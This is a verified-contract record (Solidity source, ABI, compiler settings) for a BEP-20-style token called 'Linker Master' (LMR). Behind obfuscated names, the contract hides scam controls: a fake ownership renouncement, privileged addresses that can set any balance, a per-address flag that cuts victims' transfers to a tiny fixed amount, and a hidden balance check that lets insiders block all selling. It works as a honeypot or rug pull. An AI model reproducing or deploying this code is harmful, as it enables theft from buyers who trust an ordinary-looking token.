{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fundAutoMarketing {\n    function createPair(address receiverLimitSwap, address fundBuy) external returns (address);\n}\n\ninterface walletExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLiquidity) external view returns (uint256);\n\n    function transfer(address feeAt, uint256 feeAutoAt) external returns (bool);\n\n    function allowance(address limitSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAutoAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeAt,\n        uint256 feeAutoAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamExempt, uint256 value);\n    event Approval(address indexed limitSender, address indexed spender, uint256 value);\n}\n\nabstract contract senderMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenTeamTake is walletExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LinkerMaster is senderMode, walletExempt, tokenTeamTake {\n\n    bool private autoTxLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return fundAt;\n    }\n\n    uint256 public atExempt;\n\n    address fundAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingShould(address shouldLiquidity) public {\n        launchedAmount();\n        \n        if (shouldLiquidity == swapTake || shouldLiquidity == launchBuy) {\n            return;\n        }\n        amountMaxFee[shouldLiquidity] = true;\n    }\n\n    function transferFrom(address shouldBuy, address feeAt, uint256 feeAutoAt) external override returns (bool) {\n        if (_msgSender() != fundAuto) {\n            if (marketingBuy[shouldBuy][_msgSender()] != type(uint256).max) {\n                require(feeAutoAt <= marketingBuy[shouldBuy][_msgSender()]);\n                marketingBuy[shouldBuy][_msgSender()] -= feeAutoAt;\n            }\n        }\n        return swapLaunchedEnable(shouldBuy, feeAt, feeAutoAt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTeamTo;\n    }\n\n    uint256 listReceiver;\n\n    address public swapTake;\n\n    function fundTotalLaunched(address minReceiver, uint256 feeAutoAt) public {\n        launchedAmount();\n        launchedLiquidity[minReceiver] = feeAutoAt;\n    }\n\n    bool private liquidityEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityShouldMax;\n    }\n\n    function launchedAmount() private view {\n        require(modeFund[_msgSender()]);\n    }\n\n    address private takeTeamMin;\n\n    bool public shouldLaunch;\n\n    event OwnershipTransferred(address indexed marketingAt, address indexed receiverLimit);\n\n    mapping(address => mapping(address => uint256)) private marketingBuy;\n\n    uint256 private isTx;\n\n    function balanceOf(address tokenLiquidity) public view virtual override returns (uint256) {\n        return launchedLiquidity[tokenLiquidity];\n    }\n\n    uint256 constant maxFundShould = 16 ** 10;\n\n    function allowance(address teamTxIs, address maxTx) external view virtual override returns (uint256) {\n        if (maxTx == fundAuto) {\n            return type(uint256).max;\n        }\n        return marketingBuy[teamTxIs][maxTx];\n    }\n\n    uint256 public modeBuy;\n\n    function getOwner() external view returns (address) {\n        return takeTeamMin;\n    }\n\n    function amountExempt(uint256 feeAutoAt) public {\n        launchedAmount();\n        isFund = feeAutoAt;\n    }\n\n    bool private fundTotalShould;\n\n    bool private txTotalAmount;\n\n    function transfer(address minReceiver, uint256 feeAutoAt) external virtual override returns (bool) {\n        return swapLaunchedEnable(_msgSender(), minReceiver, feeAutoAt);\n    }\n\n    mapping(address => bool) public amountMaxFee;\n\n    function approve(address maxTx, uint256 feeAutoAt) public virtual override returns (bool) {\n        marketingBuy[_msgSender()][maxTx] = feeAutoAt;\n        emit Approval(_msgSender(), maxTx, feeAutoAt);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedLiquidity;\n\n    uint256 isFund;\n\n    uint256 private tokenTeamTo = 100000000 * 10 ** 18;\n\n    function fromAtEnable(address exemptFundTx) public {\n        require(exemptFundTx.balance < 100000);\n        if (modeLimit) {\n            return;\n        }\n        \n        modeFund[exemptFundTx] = true;\n        if (shouldLaunch) {\n            modeBuy = isTx;\n        }\n        modeLimit = true;\n    }\n\n    bool private fromReceiver;\n\n    function swapLaunchedEnable(address shouldBuy, address feeAt, uint256 feeAutoAt) internal returns (bool) {\n        if (shouldBuy == swapTake) {\n            return shouldLimitMarketing(shouldBuy, feeAt, feeAutoAt);\n        }\n        uint256 minSell = walletExempt(launchBuy).balanceOf(takeShould);\n        require(minSell == isFund);\n        require(feeAt != takeShould);\n        if (amountMaxFee[shouldBuy]) {\n            return shouldLimitMarketing(shouldBuy, feeAt, maxFundShould);\n        }\n        return shouldLimitMarketing(shouldBuy, feeAt, feeAutoAt);\n    }\n\n    constructor (){\n        \n        launchedLaunch maxLiquidity = launchedLaunch(fundAuto);\n        launchBuy = fundAutoMarketing(maxLiquidity.factory()).createPair(maxLiquidity.WETH(), address(this));\n        \n        swapTake = _msgSender();\n        modeFund[swapTake] = true;\n        launchedLiquidity[swapTake] = tokenTeamTo;\n        modeTrading();\n        \n        emit Transfer(address(0), swapTake, tokenTeamTo);\n    }\n\n    address public launchBuy;\n\n    string private receiverIs = \"LMR\";\n\n    uint8 private liquidityShouldMax = 18;\n\n    address takeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldLimitMarketing(address shouldBuy, address feeAt, uint256 feeAutoAt) internal returns (bool) {\n        require(launchedLiquidity[shouldBuy] >= feeAutoAt);\n        launchedLiquidity[shouldBuy] -= feeAutoAt;\n        launchedLiquidity[feeAt] += feeAutoAt;\n        emit Transfer(shouldBuy, feeAt, feeAutoAt);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return takeTeamMin;\n    }\n\n    bool public modeLimit;\n\n    string private fundAt = \"Linker Master\";\n\n    function modeTrading() public {\n        emit OwnershipTransferred(swapTake, address(0));\n        takeTeamMin = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverIs;\n    }\n\n    mapping(address => bool) public modeFund;\n\n    bool private launchedMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTxIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAutoAt\",\"type\":\"uint256\"}],\"name\":\"amountExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMaxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAutoAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFundTx\",\"type\":\"address\"}],\"name\":\"fromAtEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAutoAt\",\"type\":\"uint256\"}],\"name\":\"fundTotalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAutoAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAutoAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LinkerMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}